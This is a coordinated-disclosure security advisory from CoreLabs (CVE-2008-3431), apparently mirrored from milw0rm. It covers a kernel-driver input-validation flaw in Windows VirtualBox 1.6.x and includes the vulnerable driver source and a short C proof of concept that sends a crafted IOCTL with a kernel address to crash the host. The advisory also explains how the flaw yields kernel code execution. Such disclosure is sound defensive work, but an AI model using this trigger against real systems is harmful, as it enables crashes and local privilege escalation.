@@ -1,0 +1,401 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+      Core Security Technologies - CoreLabs Advisory
+           http://www.coresecurity.com/corelabs/
+
+
+  Sun xVM VirtualBox Privilege Escalation Vulnerability
+
+
+*Advisory Information*
+
+Title: Sun xVM VirtualBox Privilege Escalation Vulnerability
+Advisory ID: CORE-2008-0716
+Advisory URL:
+http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability
+
+Date published: 2008-08-04
+Date of last update: 2008-08-04
+Vendors contacted: Sun Microsystems
+Release mode: Coordinated release
+
+
+*Vulnerability Information*
+
+Class: Insufficient input validation
+
+Remotely Exploitable: No
+Locally Exploitable: Yes
+Bugtraq ID: 30481	
+CVE Name: CVE-2008-3431	
+
+
+*Vulnerability Description*
+
+Virtualization technologies allow users to run different operating
+systems simultaneously on top of the same set of underlying physical
+
+hardware. This provides several benefits to end users and organizations,
+including efficiency gains in the use of hardware resources, reduction
+of operational costs, dynamic re-allocation of computing resources and
+
+rapid deployment and configuration of software development and testing
+environments.
+
+VirtualBox is an open source virtualization technology project
+originally developed by Innotek, a software company based in Germany.
+
+
+In February 2008 Sun Microsystems announced the acquisition of Innotek
+[1] and VirtualBox was integrated into Sun's xVM family of
+virtualization technologies. In May 2008, Sun Microsystems announced
+that the number of downloads of the open source VirtualBox software
+
+package passed the five million mark [2].
+
+When used on a Windows Host Operating System VirtualBox installs a
+kernel driver ('VBoxDrv.sys') to control virtualization of guest
+Operating Systems.
+
+
+An input validation vulnerability was discovered within VirtualBox's
+'VBoxDrv.sys' driver that could allow an attacker, with local but
+un-privileged access to a host where VirtualBox is installed, to execute
+
+arbitrary code within the kernel of the Windows host operating system
+and to gain complete control of a vulnerable computer system.
+
+
+*Vulnerable Packages*
+
+. Sun xVM VirtualBox 1.6.2.
+
+. Sun xVM VirtualBox 1.6.0.
+. This issue only occurs in the Microsoft Windows versions of xVM
+VirtualBox.
+
+
+*Non-vulnerable Packages*
+
+. Sun xVM VirtualBox 1.6.4 (for Microsoft Windows)
+
+
+
+*Vendor Information, Solutions and Workarounds*
+
+No workarounds exist for this issue. A security bulletin from the vendor
+that describes this issue is available here:
+http://sunsolve.sun.com/search/document.do?assetkey=1-66-240095-1.
+
+
+
+*Credits*
+
+This vulnerability was discovered and researched by Anibal Sacco from
+the CORE IMPACT Exploit Writing Team (EWT) at Core Security Technologies.
+
+
+*Technical Description / Proof of Concept Code*
+
+
+When the VirtualBox package is installed on a host the 'VBoxDrv.sys'
+driver is loaded on the machine. This driver allows any unprivileged
+user to open the device '\\.\VBoxDrv' and issue IOCTLs with a buffering
+
+mode of METHOD_NEITHER without any kind of validation. This allows
+untrusted user mode code to pass arbitrary kernel addresses as arguments
+to the driver.
+
+With specially constructed input, a malicious user can use functionality
+
+within the driver to patch kernel addresses and execute arbitrary code
+in kernel mode. When handling IOCTLs a communication method must be
+pre-defined between the user-mode application and the driver module. The
+
+selected method will determine how the I/O Manager manipulates memory
+buffers used in the communication.
+
+The 'METHOD_NEITHER' is a very dangerous method because the pointer
+passed to 'DeviceIoControl' as input or output buffer will be sent
+
+directly to the driver, thus transferring it the responsibility of doing
+the proper checks to validate the addresses sent from user mode.
+
+The 'VBoxDrv.sys' driver uses the 'METHOD_NEITHER' communication method
+
+when handling IOCTLs request and does not validate properly the buffer
+sent in the Irp object allowing an attacker to write to any memory
+address in the kernel-mode.
+
+Let's see the bug on the source. This is the function used to handle the
+
+IOCTL requests at 'SUPDrv-win.cpp'.
+
+/-----------
+
+  NTSTATUS _stdcall VBoxDrvNtDeviceControl(PDEVICE_OBJECT pDevObj, PIRP
+pIrp)
+  {
+    PSUPDRVDEVEXT       pDevExt = (PSUPDRVDEVEXT)pDevObj->DeviceExtension;
+
+    PIO_STACK_LOCATION  pStack = IoGetCurrentIrpStackLocation(pIrp);
+    PSUPDRVSESSION      pSession =
+(PSUPDRVSESSION)pStack->FileObject->FsContext;
+
+    /*
+    * Deal with the two high-speed IOCtl that takes it's arguments from
+
+    * the session and iCmd, and only returns a VBox status code.
+    */
+    ULONG ulCmd = pStack->Parameters.DeviceIoControl.IoControlCode;
+    if (    ulCmd == SUP_IOCTL_FAST_DO_RAW_RUN
+(1)   ||  ulCmd == SUP_IOCTL_FAST_DO_HWACC_RUN
+
+      ||  ulCmd == SUP_IOCTL_FAST_DO_NOP)
+    {
+      KIRQL oldIrql;
+      int   rc;
+
+      /* Raise the IRQL to DISPATCH_LEVEl to prevent Windows from
+rescheduling us to another CPU/core. */
+      Assert(KeGetCurrentIrql() <= DISPATCH_LEVEL);
+
+      KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);
+(2)   rc = supdrvIOCtlFast(ulCmd, pDevExt, pSession);
+      KeLowerIrql(oldIrql);
+
+      /* Complete the I/O request. */
+      NTSTATUS rcNt = pIrp->IoStatus.Status = STATUS_SUCCESS;
+
+      pIrp->IoStatus.Information = sizeof(rc);
+      __try
+      {
+(3)     *(int *)pIrp->UserBuffer = rc;
+      }
+      __except(EXCEPTION_EXECUTE_HANDLER)
+      {
+        rcNt = pIrp->IoStatus.Status = GetExceptionCode();
+
+        dprintf(("VBoxSupDrvDeviceContorl: Exception Code %#x\n", rcNt));
+      }
+      IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+      return rcNt;
+    }
+
+    return VBoxDrvNtDeviceControlSlow(pDevExt, pSession, pIrp, pStack);
+
+  }
+
+- -----------/
+
+At (1), we can see the sentence checking the IOCTL code. The constants
+use are defined at 'SUPDrvIOC.h' in this way:
+
+/-----------
+
+#define SUP_IOCTL_FAST_DO_RAW_RUN               SUP_CTL_CODE_FAST(64)
+
+/** Fast path IOCtl: VMMR0_DO_HWACC_RUN */
+#define SUP_IOCTL_FAST_DO_HWACC_RUN             SUP_CTL_CODE_FAST(65)
+/** Just a NOP call for profiling the latency of a fast ioctl call to
+VMMR0. */
+#define SUP_IOCTL_FAST_DO_NOP                   SUP_CTL_CODE_FAST(66)
+
+
+- -----------/
+
+With the macro 'SUP_CTL_CODE_FAST()' defined in the same file:
+
+/-----------
+
+#define SUP_CTL_CODE_FAST(Function) CTL_CODE(FILE_DEVICE_UNKNOWN,
+(Function)
+                                       | SUP_IOCTL_FLAG, METHOD_NEITHER,
+
+                                         FILE_WRITE_ACCESS)
+
+- -----------/
+
+Now we know that the communication method used will be 'METHOD_NEITHER '
+(this could also be easily seen by looking at the resulting IOCTL code
+
+in the disassembled binary).
+
+Then at (2) the value returned by 'supdrvIOCtlFast()' is saved in 'rc'
+and this is where the problem starts because at (3), the value in 'rc'
+is written directly to the buffer pointer sent from usermode without any
+
+check to validate that it is really pointing to an usermode address or
+even a valid one.
+
+In this scenario, it is possible to feed the IOCTL with kernel addresses
+to write the value returned by 'supdrvIOCtlFast()' ANY address in kernel
+
+space memory as many times as necessary to modify kernel code or kernel
+pointers to subsequently get code execution in ring 0 context (that
+means, with system privileges).
+
+This is the Proof of Concept I have made to trigger and show the
+
+vulnerability. This will generate a Blue Screen of Death (BSOD) trying
+to write to an unpaged kernel mode address (0x80808080) but any other
+arbitrary address could be used.
+
+/-----------
+
+// Author:       Anibal Sacco (aLS)
+
+// Contact:      anibal.sacco@coresecurity.com
+//           anibal.sacco@gmail.com
+// Organization: Core Security Technologies
+
+
+#include <windows.h/>
+#include <stdio.h/>
+
+int main(int argc, char **argv)
+{
+  HANDLE   hDevice;
+  DWORD    cb;
+  char     szDevice[] = "\\\\.\\VBoxDrv";
+
+  if ( (hDevice = CreateFileA(szDevice,
+
+                          GENERIC_READ|GENERIC_WRITE,
+                          0,
+                          0,
+                          OPEN_EXISTING,
+                          0,
+                          NULL) ) != INVALID_HANDLE_VALUE )
+
+  {
+    printf("Device %s succesfully opened!\n", szDevice);
+  }
+  else
+  {
+    printf("Error: Error opening device %s\n",szDevice);
+  }
+
+  cb = 0;
+  if (!DeviceIoControl(hDevice,
+
+        0x228103,
+        (LPVOID)0x80808080,0,
+        (LPVOID)0x80808080,0x0,
+        &cb,
+        NULL))
+  {
+    printf("Error in DeviceIo ... bytes returned %#x\n",cb);
+  }
+}
+
+
+- -----------/
+
+
+*Report Timeline*
+
+. 2008-07-16: Core Security Technologies notifies the VirtualBox team of
+the vulnerability.
+. 2008-07-17: Vendor acknowledges notification.
+. 2008-07-29: Core asks the vendor for a status update in the fixing
+
+process.
+. 2008-07-30: Vendor notifies a patched version will be publicly
+available on Monday 4th, August.
+. 2008-07-31: Core asks the vendor to provide URL to their alert and to
+confirm which versions are vulnerable and which version will include the
+
+fix.
+. 2008-07-31: CVE ID request sent to Mitre.
+. 2008-07-31: Bugtraq ID request sent to SecurityFocus.com.
+. 2008-07-31: CVE ID received from Mitre.
+. 2008-07-31: Bugtraq ID received SecurityFocus.com.
+. 2008-08-01: Vendor provides draft version of Sun Alert and URL to
+
+reference it.
+. 2008-08-01: Core updates its security advisory with information about
+vulnerable and non-vulnerable packages. Core provides its URL to the
+vendor and indicates that the vendor cataloged the issue as a Denial of
+
+Service bug but it should be considered a privilege escalation problem
+since it allows unprivileged users to execute code in the kernel context.
+. 2008-08-04: Vendor confirms that this issue can lead to arbitrary code
+
+execution by an unprivileged user.
+. 2008-08-04: CORE-2008-0716 advisory is published.
+
+
+*References*
+
+[1] Sun Welcomes Innotek - http://www.sun.com/software/innotek/.
+
+[2] http://www.sun.com/aboutsun/pr/2008-05/sunflash.20080529.1.xml.
+
+
+*About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+
+http://www.coresecurity.com/corelabs/.
+
+
+*About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+
+http://www.coresecurity.com.
+
+
+*Disclaimer*
+
+The contents of this advisory are copyright (c) 2008 Core Security
+Technologies and (c) 2008 CoreLabs, and may be distributed freely
+
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+*GPG/PGP Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (MingW32)
+
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFIl2jIyNibggitWa0RAtj0AJ9HSRe3Hq+SCqU0RfU2LwaxINL1NwCdH5p+
+md6p6ZKbhrc7SfaD6EsxjoA=
+=kQyV
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2008-08-10]
